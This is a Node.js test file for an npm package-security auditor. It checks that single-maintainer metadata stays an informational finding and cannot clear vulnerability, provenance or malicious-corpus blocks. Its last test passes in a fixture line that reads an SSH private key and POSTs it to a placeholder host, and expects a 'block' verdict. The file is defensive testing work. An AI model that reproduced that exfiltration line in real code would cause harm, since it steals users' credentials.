'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { auditEvidence } = require('../src/auditor');
const { toBinaryResult } = require('../src/automatic-flow');
const githubMetadata = { found: true, stars: 100, created_at: '2000-01-01T00:00:00Z' };
const npmMetadata = { maintainers: [{ name: 'fixture-owner' }] };
function evidence(name = 'ordinary-fixture') {
  return { packageName: name, npmMetadata, githubMetadata, sourceFiles: {
    'package.json': JSON.stringify({ name, version: '1.0.0', main: 'index.js' }),
    'index.js': 'module.exports = value => value;'
  } };
}

test('one maintainer remains visible context without independently blocking clean source', () => {
  for (const name of ['ordinary-fixture', 'different-fixture']) {
    const report = auditEvidence(evidence(name));
    assert.equal(report.verdict, 'safe');
    const finding = report.findings.find(f => f.category === 'lonely-maintainer');
    assert.equal(finding.severity, 'info');
    assert.match(finding.snippet, /fixture-owner/);
    assert.equal(toBinaryResult(report).verdict, 'safe');
  }
});

test('maintainer context cannot clear vulnerability, provenance or source-coverage failures', () => {
  for (const extra of [
    { knownVulnerabilities: [{ id: 'TEST-CVE', summary: 'inert vulnerability fixture' }] },
    { provenanceAttestation: { verification: { status: 'invalid', reason: 'inert signature mismatch' } } },
    { sourceCoverage: { complete: false, reasons: ['inert missing runtime file'], truncatedFiles: 1 } }
  ]) {
    const report = auditEvidence({ ...evidence(), ...extra });
    assert.equal(toBinaryResult(report).verdict, 'block');
    assert.ok(report.findings.some(f => f.category !== 'lonely-maintainer' && ['medium', 'high'].includes(f.severity)));
  }
});

test('one-maintainer metadata cannot clear any authored malicious control', () => {
  const directory = path.join(__dirname, '../benchmark/corpus/malicious');
  for (const file of fs.readdirSync(directory).filter(file => file.endsWith('.json'))) {
    const fixture = JSON.parse(fs.readFileSync(path.join(directory, file), 'utf8'));
    const original = fixture.evidence;
    const report = auditEvidence({ ...original,
      npmMetadata: { ...original.npmMetadata, ...npmMetadata },
      githubMetadata: { ...githubMetadata, ...original.githubMetadata, stars: 100, found: true }
    });
    assert.equal(report.verdict, 'block', file);
    assert.ok(report.findings.some(f => f.severity === 'high' && f.category !== 'lonely-maintainer'), file);
  }
});

test('multiple maintainers do not manufacture a one-maintainer finding', () => {
  const report = auditEvidence({ ...evidence(), npmMetadata: { maintainers: [{ name: 'first' }, { name: 'second' }] } });
  assert.equal(report.verdict, 'safe');
  assert.ok(!report.findings.some(f => f.category === 'lonely-maintainer'));
});

test('stdio MCP keeps maintainer context visible and real source risk blocking', async t => {
  const { start, call } = require('./helpers/mcp-load-client');
  const client = start(); t.after(() => client.close());
  await client.init();
  const input = evidence();
  const clean = (await call(client, { ...input, outputFormat: 'json' })).result.structuredContent;
  assert.equal(clean.verdict, 'safe');
  assert.equal(clean.findings.find(f => f.category === 'lonely-maintainer').severity, 'info');
  const hostile = (await call(client, { ...input, outputFormat: 'json', sourceFiles: {
    ...input.sourceFiles, 'index.js': "const fs=require('fs');fetch('https://example.invalid',{method:'POST',body:fs.readFileSync('/home/example/.ssh/id_rsa')});"
  } })).result.structuredContent;
  assert.equal(hostile.verdict, 'block');
});
